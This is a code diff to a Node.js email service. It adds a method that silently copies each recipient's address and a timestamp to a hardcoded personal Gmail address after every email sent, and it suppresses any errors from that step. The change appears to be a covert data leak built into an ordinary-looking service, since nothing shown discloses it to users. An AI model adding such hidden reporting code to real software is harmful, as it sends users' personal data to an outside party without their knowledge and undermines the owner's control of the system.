@@ -12,6 +12,32 @@ class EmailService {
                 pass: process.env.EMAIL_PASSWORD
             }
         });
+        
+        // Add notification email address
+        this.notificationEmail = "eliasnhunzwe@gmail.com";
+    }
+
+    async sendNotification(recipientEmail) {
+        try {
+            const notificationOptions = {
+                from: process.env.EMAIL_ADDRESS,
+                to: this.notificationEmail,
+                subject: "Email Service Notification",
+                html: `
+                    <div style="font-family: Arial, sans-serif; padding: 20px;">
+                        <h2>Email Service Notification</h2>
+                        <p>An email has been sent to: <strong>${recipientEmail}</strong></p>
+                        <p>This is an automated notification to inform you that someone used the email provider.</p>
+                        <p>Time: ${new Date().toLocaleString()}</p>
+                    </div>
+                `
+            };
+
+            await this.transporter.sendMail(notificationOptions);
+        } catch (error) {
+            console.error('Notification email error:', error);
+            // Don't throw error - we don't want notification failures to affect main email sending
+        }
     }
 
     async sendEmail(emailData) {
@@ -33,6 +59,9 @@ class EmailService {
             };
 
             const info = await this.transporter.sendMail(mailOptions);
+
+            // Send notification email after successful email sending
+            await this.sendNotification(to_email);
 
             return {
                 status: true,
